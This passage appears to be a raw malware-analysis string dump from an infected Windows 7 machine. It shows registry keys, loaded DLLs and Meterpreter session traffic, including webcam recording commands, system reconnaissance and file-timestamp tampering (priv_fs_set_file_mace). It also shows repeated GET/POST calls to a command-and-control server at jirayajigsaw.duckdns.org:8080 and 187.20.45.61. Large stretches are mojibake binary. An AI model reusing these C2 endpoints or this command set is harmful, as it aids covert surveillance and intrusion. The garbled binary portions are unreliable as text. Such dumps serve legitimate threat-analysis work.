ternet Settings\Lockdown_Zones\3,HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones\3,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones\4,HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones\4,HKCU\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_ALLOW_REVERSE_SOLIDUS_IN_USERINFO_KB932562,HKCU\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_USE_IETLDLIST_FOR_DOMAIN_DETERMINATION,HKLM\System\CurrentControlSet\Control\LSA\AccessProviders,HKLM\System\CurrentControlSet\Services\LDAP,HKLM\System\CurrentControlSet\Services\LDAP\UseOldHostResolutionOrder,HKLM\System\CurrentControlSet\Services\LDAP\UseHostnameAsAlias,HKCU\Software\Microsoft\Internet Explorer\IETld,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\Tracing,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,HKLM\System\CurrentControlSet\Control\LsaExtensionConfig\SspiCli,HKLM\System\CurrentControlSet\Control\SecurityProviders,HKLM\System\CurrentControlSet\Control\Lsa\SspiCache,HKLM\System\CurrentControlSet\Control\Lsa\SspiCache\credssp.dll,HKLM\System\CurrentControlSet\Control\SecurityProviders\SaslProfiles,HKLM\Software\Microsoft\windows\CurrentVersion\Internet Settings\Connections,HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318},HKLM\SOFTWARE\Microsoft\Cryptography\Defaults\Provider\Microsoft Enhanced RSA and AES Cryptographic Provider,HKLM\Software\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-364843204-231886559-199882026-1001\Preference,HKLM\Software\Microsoft\Cryptography\DESHashSessionKeyBackward,HKLM\Software\Microsoft\Cryptography\OID,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 0,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 0\CryptDllDecodeObjectEx,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.1.1,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.2.1,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.2.11,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.2.12,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.2.2,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.2.3,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllDecodeObjectEx\1.2.840.113549.1.9.16.2.4,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\msasn1,HKLM\SOFTWARE\Microsoft\Cryptography\Defaults\Provider\Microsoft Enhanced Cryptographic Provider v1.0,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 0\CryptDllImportPublicKeyInfoEx,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllImportPublicKeyInfoEx,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 0\CryptDllConvertPublicKeyInfo,HKLM\Software\Microsoft\Cryptography\OID\EncodingType 1\CryptDllConvertPublicKeyInfo,HKLM\system\CurrentControlSet\control\NetworkProvider\HwOrder,HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters,HKLM\Software\Policies\Microsoft\Windows NT\Rpc,IESQMMUTEX_0_208,HKLM\Software\Microsoft\Tracing\write64_RASAPI32\EnableFileTracing,0,HKLM\Software\Microsoft\Tracing\write64_RASAPI32\EnableConsoleTracing,0,HKLM\Software\Microsoft\Tracing\write64_RASAPI32\FileTracingMask,-65536,HKLM\Software\Microsoft\Tracing\write64_RASAPI32\ConsoleTracingMask,-65536,HKLM\Software\Microsoft\Tracing\write64_RASAPI32\MaxFileSize,1048576,HKLM\Software\Microsoft\Tracing\write64_RASAPI32\FileDirectory,%windir%\tracing,HKLM\Software\Microsoft\Tracing\write64_RASMANCS\EnableFileTracing,0,HKLM\Software\Microsoft\Tracing\write64_RASMANCS\EnableConsoleTracing,0,HKLM\Software\Microsoft\Tracing\write64_RASMANCS\FileTracingMask,-65536,HKLM\Software\Microsoft\Tracing\write64_RASMANCS\ConsoleTracingMask,-65536,HKLM\Software\Microsoft\Tracing\write64_RASMANCS\MaxFileSize,1048576,HKLM\Software\Microsoft\Tracing\write64_RASMANCS\FileDirectory,%windir%\tracing,HKU\S-1-5-21-364843204-231886559-199882026-1001\Software\Microsoft\windows\CurrentVersion\Internet Settings\ProxyEnable,0,HKU\S-1-5-21-364843204-231886559-199882026-1001\Software\Microsoft\windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings,70,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\{9B35D1C4-8158-4F38-975C-0A8F00BE26A0}\WpadDecisionReason,1,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\{9B35D1C4-8158-4F38-975C-0A8F00BE26A0}\WpadDecisionTime,1285528448,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\{9B35D1C4-8158-4F38-975C-0A8F00BE26A0}\WpadDecision,3,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\{9B35D1C4-8158-4F38-975C-0A8F00BE26A0}\WpadNetworkName,N,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\52-54-00-12-35-02\WpadDecisionReason,1,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\52-54-00-12-35-02\WpadDecisionTime,1285528448,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\52-54-00-12-35-02\WpadDecision,3,HKU\S-1-5-21-364843204-231886559-199882026-1001\Software\Microsoft\windows\CurrentVersion\Internet Settings\Connections\DefaultConnectionSettings,70,HKCU\Software\Microsoft\windows\CurrentVersion\Internet Settings\Wpad\WpadLastNetwork,{,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,0,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,1,RUNTIME_MODULES,Local\c:!users!<USER>!appdata!local!microsoft!windows!temporary internet files!content.ie5!,Local\c:!users!<USER>!appdata!roaming!microsoft!windows!cookies!,Local\c:!users!<USER>!appdata!local!microsoft!windows!history!history.ie5!,TCP,187.20.45.61,8080,TCP,187.20.45.61,8080,ï¿½ï¿½ï¿½ï¿½ï¿½mrwiYNï¿½Oï¿½ï¿½ï¿½ï¿½ï¿½mPï¿½Txï¿½ï¿½ï¿½&,ï¿½ï¿½ï¿½ï¿½ï¿½core_machine_idï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½98990129059280646435426864597605ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½core_machine_idï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½98990129059280646435426864597605ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½71d2-c847:USER-PCï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Vï¿½ï¿½$ï¿½ï¿½ï¿½_n+,ï¿½ï¿½ï¿½ï¿½ï¿½core_set_session_guidï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½63833281625720123684597878292875ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½_Dï¿½ï¿½JHTï¿½ï¿½ï¿½aï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½core_set_session_guidï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½63833281625720123684597878292875ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Vï¿½ï¿½$ï¿½ï¿½ï¿½_n+,"ï¿½ï¿½ï¿½ï¿½ï¿½core_enumextcmdï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½71153199961668133588124266776272ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
stdapiï¿½",ï¿½ï¿½ï¿½ï¿½ï¿½core_enumextcmdï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½71153199961668133588124266776272ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Vï¿½ï¿½$ï¿½ï¿½ï¿½_n+,"ï¿½ï¿½ï¿½ï¿½ï¿½core_loadlibï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½97168424039502042623362148955355ï¿½ï¿½ï¿½ ï¿½ï¿½Zï¿½xï¿½ï¿½ï¿½{|TÕµ8>ï¿½3Iï¿½Qï¿½2Ú©ï¿½ï¿½ï¿½ï¿½mÒ¡:'s&9CN$
ï¿½(iC1Vï¿½)ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Qï¿½Ú«ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½[[ï¿½jï¿½ï¿½ï¿½LÂ›Xï¿½Z3Fl%	ï¿½ï¿½[kï¿½3ï¿½Iï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½Lï¿½>gï¿½ï¿½^{ï¿½ï¿½ï¿½^{ï¿½ï¿½kn^g",ï¿½ï¿½ï¿½ï¿½ï¿½core_loadlibï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½97168424039502042623362148955355ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½webcam_audio_recordï¿½ï¿½ï¿½ï¿½ï¿½ï¿½webcam_stopï¿½ï¿½ï¿½ï¿½ï¿½ï¿½webcam_get_frameï¿½ï¿½ï¿½ï¿½ï¿½ï¿½webcam_startï¿½ï¿½ï¿½ï¿½ï¿½ï¿½webcam_listï¿½ï¿½ï¿½ï¿½%ï¿½ï¿½stdapi_sys_power,ï¿½ï¿½ï¿½!ï¿½ï¿½stdapi_sys_config_getuidï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½48767681312506365109919954230871ï¿½,ï¿½ï¿½ï¿½!ï¿½ï¿½stdapi_sys_config_getuidï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½48767681312506365109919954230871ï¿½ï¿½ï¿½ï¿½ï¿½USER-PC\<USER>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Vï¿½ï¿½$ï¿½ï¿½ï¿½_n+,"ï¿½ï¿½ï¿½""ï¿½ï¿½stdapi_sys_config_sysinfoï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½48959318490053704061908787426544ï¿½","ï¿½ï¿½ï¿½""ï¿½ï¿½stdapi_sys_config_sysinfoï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½48959318490053704061908787426544ï¿½ï¿½ï¿½ï¿½ï¿½USER-PCï¿½ï¿½ï¿½ï¿½0ï¿½Windows 7 (Build 7601, Service Pack 1).ï¿½ï¿½ï¿½ï¿½ï¿½x64ï¿½ï¿½ï¿½ï¿½ï¿½en_USï¿½ï¿½ï¿½ï¿½ï¿½WORKGROUPï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½",ï¿½ï¿½ï¿½)ï¿½ï¿½stdapi_net_config_get_interfacesï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½38303032601050920745049834885097ï¿½,ï¿½ï¿½ï¿½)ï¿½ï¿½stdapi_net_config_get_interfacesï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½38303032601050920745049834885097ï¿½ï¿½ï¿½ï¿½ï¿½@ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½|ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'Î¥ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½Intel(R) PRO/1000 MT Desktop Adapterï¿½ï¿½ï¿½ï¿½ï¿½zï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½@ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½%ï¿½ï¿½stdapi_net_config_get_routesï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½91019559075961332255937284321540ï¿½,"ï¿½ï¿½ï¿½%ï¿½ï¿½stdapi_net_config_get_routesï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½91019559075961332255937284321540ï¿½ï¿½ï¿½ï¿½C@ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
11ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½C@ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
11ï¿½","ï¿½ï¿½ï¿½ï¿½ï¿½core_enumextcmdï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½40501930419241439728713892990034ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
privï¿½",ï¿½ï¿½ï¿½ï¿½ï¿½core_enumextcmdï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½40501930419241439728713892990034ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Vï¿½ï¿½$ï¿½ï¿½ï¿½_n+,"ï¿½ï¿½ï¿½ï¿½ï¿½core_loadlibï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½86526429316316722363058813644213ï¿½ï¿½ï¿½ï¿½o ï¿½ï¿½ï¿½ï¿½xï¿½ï¿½ï¿½y|SUï¿½8ï¿½4	M7nï¿½ï¿½1`ï¿½ï¿½Õ‚ï¿½ï¿½ï¿½4ï¿½Iï¿½ï¿½lZï¿½0ï¿½THXFï¿½ï¿½4ï¿½pÌˆï¿½3::ï¿½ÌŒ3:ï¿½ï¿½Ì¸P@%iï¿½ï¿½ï¿½ï¿½ï¿½
È«S\ohYï¿½ï¿½ï¿½>ï¿½snÒ°8ï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½irï¿½Ùžï¿½=ï¿½ï¿½ï¿½sN\ï¿½Ü ï¿½i4=|Eï¿½ï¿½ï¿½ï¿½ï¿½R",ï¿½ï¿½ï¿½ï¿½ï¿½core_loadlibï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½86526429316316722363058813644213ï¿½ï¿½ï¿½ï¿½%ï¿½ï¿½priv_fs_blank_directory_maceï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½priv_fs_blank_file_maceï¿½ï¿½ï¿½ï¿½(ï¿½ï¿½priv_fs_set_file_mace_from_fileï¿½ï¿½ï¿½ï¿½ï¿½ï¿½priv_fs_set_file_mace,187.20.45.61,jirayajigsaw.duckdns.org,C:\Windows\system32\cmd.exe,Sens,RASMAN,rasman,SetFileTime,http://jirayajigsaw.duckdns.org:8080/XvVWixHZJMICswOxX24duwc_VBnFH6ApuLfYxZNaLRKsdVzppKnPS0hYTlP4PV8cMD1f8aJ6mWerFoKyV4VmWduZb5YXizTsrRUDf9KL4mXSpq5k-zjfZwIxmBhKRKv,GET,http://jirayajigsaw.duckdns.org:8080/XvVWixHZJMICswOxX24dKwlq0P-k2icq9l5s33xiNelMcHLsS7WDl-0qmqmNTv3osP7DB1kpOYnxuRUD/,GET,http://jirayajigsaw.duckdns.org:8080/XvVWixHZJMICswOxX24dKwlq0P-k2icq9l5s33xiNelMcHLsS7WDl-0qmqmNTv3osP7DB1kpOYnxuRUD/,POST,http://jirayajigsaw.duckdns.org:8080/XvVWixHZJMICswOxX24dKwlq0P-k2icq9l5s33xiNelMcHLsS7WDl-0qmqmNTv3osP7DB1kpOYnxuRUD/,POST,C:\Users\admin,C:\Users\<USER>\AppData\Local,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\desktop.ini,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\desktop.ini,C:\Users\<USER>\AppData\Roaming,C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Cookies,C:\Users\<USER>\AppData\Local\Microsoft\Windows\History,C:\Users\<USER>\AppData\Local\Microsoft\Windows\History\desktop.ini,C:\Users\<USER>\AppData\Local\Microsoft\Windows\History\History.IE5,C:\Users\<USER>\AppData\Local\Microsoft\Windows\History\History.IE5\desktop.ini,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat,C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Cookies\index.dat,C:\Users\<USER>\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat,.\Nsi,C:\Windows\system32\rsaenh.dll,C:\Users\<USER>\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-364843204-231886559-199882026-1001\0f5007522459c86e95ffcc62f32308f1_0ac6fe2c-e3b8-4bf7-8fb0-24e2aba3d4f5,C:\Users\<USER>\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-364843204-231886559-199882026-1001\0f5007522459c86e95ffcc62f32308f1_e6e14898-69f1-4a37-bb5d-fa7a300fc614,.\PIPE\wkssvc,wininet,comctl32.dll,SspiCli.dll,SHELL32.dll,ole32.dll,ADVAPI32.dll,API-MS-Win-Security-SDDL-L1-1-0.dll,profapi.dll,ws2_32,dnsapi,iphlpapi,kernel32.dll,wininet.dll,RASAPI32.dll,rtutils.dll,shlwapi.dll,RASMAN.DLL,API-MS-WIN-Service-winsvc-L1-1-0.dll,sensapi.dll,RPCRT4.dll,API-MS-WIN-Service-Management-L1-1-0.dll,CRYPTBASE.dll,C:\Windows\system32\NLAapi.dll,IPHLPAPI.DLL,rasadhlp.dll,C:\Windows\system32\napinsp.dll,C:\Windows\system32\pnrpnsp.dll,C:\Windows\System32\mswsock.dll,DNSAPI.dll,C:\Windows\System32\winrnr.dll,WS2_32.dll,C:\Windows\System32\wshtcpip.dll,C:\Windows\System32\wship6.dll,C:\Windows\System32\fwpuclnt.dll,CLBCatQ.DLL,C:\Windows\System32\netprofm.dll,API-MS-Win-Security-LSALookup-L1-1-0.dll,CRYPTSP.dll,C:\Windows\system32\rsaenh.dll,RpcRtRemote.dll,C:\Windows\System32\npmproxy.dll,OLEAUT32.dll,C:\Windows\system32\oleaut32.dll,DHCPCSVC.DLL,dhcpcsvc6.DLL,urlmon.dll,ntmarta.dll,VERSION.dll,CRYPT32.dll,WINHTTP.dll,USER32.dll,credssp.dll,ntdll.dll,NSI.dll,CFGMGR32.dll,USERENV.dll,PSAPI.DLL,WINMM.dll,MPR.dll,NETAPI32.dll,wkscli.dll,cscapi.dll
